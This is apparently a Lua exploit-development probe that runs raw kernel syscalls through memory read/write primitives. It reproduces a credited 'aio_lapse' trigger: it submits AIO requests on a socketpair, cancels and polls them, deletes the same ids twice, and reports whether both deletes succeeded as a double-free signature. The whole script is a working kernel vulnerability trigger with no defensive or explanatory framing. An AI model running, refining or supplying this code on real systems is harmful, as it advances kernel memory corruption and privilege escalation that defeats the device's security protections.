-- CRASH_CLASS: HIGH
-- PROBE 894a: zecoxao's stage-3 shape -- cancel, poll, then delete twice
--
-- Their trigger (gist 80dff057, aio_lapse_exploit.c): submit(cmd READ|MULTI)
-- -> cancel(terminal) -> poll -> delete, and the win signal is BOTH deletes
-- reporting err 0 for the same slot, i.e. the same object freed twice with no
-- crash needed to see it. Our previous disproves deleted without the poll, so
-- they never had [W+0xc] set (the delete body's lock-drop branch needs [W+4]
-- and [W+0xc]). This run is that exact sequence, single-threaded first.

print("=== PROBE 894a: AIO POLL THEN DOUBLE DELETE ===")
print("")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function show(tag, ok, rv)
    if not ok then print(string.format("  [%s] PCALL-FAIL", tag)) return end
    local h, l = get_hi_lo(rv)
    print(string.format("  [%s] ret=0x%08X_%08X", tag, h, l))
end
local function rd(addr) local ok,v = pcall(function() return to_num(memory.read_dword(addr)) end) if ok then return v end return -999 end
local function wd(addr,v) pcall(function() memory.write_dword(addr,v) end) end

local pid = 0
repeat local ok,rv = pcall(function() return make_syscall(20)() end) if ok then pid = to_num(rv) end until true
print(string.format("[A] pid = %u", pid))

-- B. socketpair(AF_UNIX=1, SOCK_STREAM=1)
local sv = memory.alloc(8)
wd(sv, 0) wd(sv + 4, 0)
local sc135 = make_syscall(135)
show("socketpair", pcall(function() return sc135(uint64(1), uint64(1), uint64(0), uint64(sv)) end))
local fd0, fd1 = rd(sv), rd(sv + 4)
print(string.format("  fds = %d, %d", fd0, fd1))
if fd0 <= 0 then print("no usable socketpair; aborting") print("=== DONE ===") return end

-- C. linger (best effort, mirrors the gist)
local lg = memory.alloc(8)
wd(lg, 1) wd(lg + 4, 1)
local sc105 = make_syscall(105)
show("SO_LINGER", pcall(function() return sc105(uint64(fd0), uint64(0xFFFF), uint64(0x80), uint64(lg), uint64(8)) end))

local N = 4
local reqs = memory.alloc(0x28 * N)
local ids  = memory.alloc(8 * N)
local st   = memory.alloc(8 * N)
local e1   = memory.alloc(8 * N)
local e2   = memory.alloc(8 * N)
local buf  = memory.alloc(0x1000)
for i = 0, N * 0x28 - 1, 4 do wd(reqs + i, 0) end
-- offset 0, nbytes 0x1000, buf, unk 0, fd, pad
for i = 0, N - 1 do
    local r = reqs + i * 0x28
    wd(r + 0x08, 0x1000)
    wd(r + 0x10, tostring(buf):match("0x(%x+)") and tonumber(tostring(buf):match("0x(%x+)"), 16) or 0)
    wd(r + 0x20, fd0)
end
-- note: buf pointer written as two dwords if the alloc address is 64-bit
local bstr = tostring(buf)
local blo = tonumber(bstr:match("0x(%x+)") or "0", 16)
print(string.format("  buf=0x%X", blo))
for i = 0, N - 1 do
    local r = reqs + i * 0x28
    wd(r + 0x10, blo % 4294967296)
    wd(r + 0x14, math.floor(blo / 4294967296))
end

local sc669 = make_syscall(669)
local sc666 = make_syscall(666)
local sc664 = make_syscall(664)
local sc662 = make_syscall(662)

print("[B1] submit 669(cmd=0x1001, reqs, 4, prio=3, ids):")
show("submit", pcall(function() return sc669(uint64(0x1001), uint64(reqs), uint64(N), uint64(3), uint64(ids)) end))
for i = 0, N - 1 do print(string.format("    id[%d]=0x%08X", i, rd(ids + i * 4))) end

print("[B2] cancel 666:")
show("cancel", pcall(function() return sc666(uint64(ids), uint64(N), uint64(st)) end))
for i = 0, N - 1 do print(string.format("    state[%d]=%d", i, rd(st + i * 4))) end

print("[B3] poll 664 (this is the step our earlier disproves lacked):")
show("poll", pcall(function() return sc664(uint64(ids), uint64(N), uint64(st)) end))
for i = 0, N - 1 do print(string.format("    state[%d]=%d", i, rd(st + i * 4))) end

print("[B4] delete #1 662:")
show("delete1", pcall(function() return sc662(uint64(ids), uint64(N), uint64(e1)) end))
for i = 0, N - 1 do print(string.format("    err1[%d]=0x%08X", i, rd(e1 + i * 4))) end

print("[B5] delete #2 662 (same ids):")
local ok2, rv2 = pcall(function() return sc662(uint64(ids), uint64(N), uint64(e2)) end)
show("delete2", ok2, rv2)
local both = false
for i = 0, N - 1 do
    local a, b = rd(e1 + i * 4), rd(e2 + i * 4)
    print(string.format("    err2[%d]=0x%08X   (err1=0x%08X)%s", i, b, a,
        (a == 0 and b == 0) and "   <-- BOTH ZERO = DOUBLE FREE" or ""))
    if a == 0 and b == 0 then both = true end
end
print(string.format("[C] double-free signature: %s", both and "YES" or "no"))

print("")
print("=== PROBE 894a DONE ===")
